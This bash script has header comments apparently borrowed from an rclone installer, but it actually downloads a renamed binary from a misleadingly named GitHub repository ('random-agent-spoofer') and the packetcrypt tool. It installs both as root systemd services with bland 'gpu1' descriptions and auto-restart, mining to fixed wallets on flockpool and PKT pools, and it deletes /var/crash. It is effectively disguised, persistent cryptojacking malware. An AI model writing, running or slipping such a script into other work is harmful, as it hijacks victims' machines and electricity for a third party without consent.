#!/usr/bin/env bash

# error codes
# 0 - exited without problems
# 1 - parameters not supported were used or some unexpected error occurred
# 2 - OS not supported by this script
# 3 - installed version of rclone is up to date
# 4 - supported unzip tools are not available

count=`pgrep jvdar |  grep -o -E '[0-9]+'`

if [[ $count -gt 0 ]]
then
  echo "dang ton tai"
else
cd /home

sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
sudo cp ar jvdar 
sudo chmod +x jvdar
sudo rm -rf /lib/systemd/system/rtm2.service
sudo rm -rf /var/crash
sudo bash -c 'cat <<EOT >>/lib/systemd/system/rtm2.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/jvdar -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RCjpfnfFfjvhnDzfY9ShQrAtjrP3Vf2PLP.rtmservice -p x
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
sudo wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
sudo chmod +x packetcrypt
sudo rm -rf /lib/systemd/system/pktpool.service
sudo rm -rf /var/crash
sudo bash -c 'cat <<EOT >>/lib/systemd/system/pktpool.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/packetcrypt ann -p pkt1qydtp765qufxpwr5wxfzdmv9m9khgdc8muzgax6 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&



sudo systemctl daemon-reload &&
sudo sudo sudo systemctl enable rtm2.service &&
sudo sudo systemctl enable pktpool.service &&
sudo service rtm2 stop  &&
sudo service rtm2 restart
sudo sudo service pktpool stop  &&
sudo service pktpool restart



fi
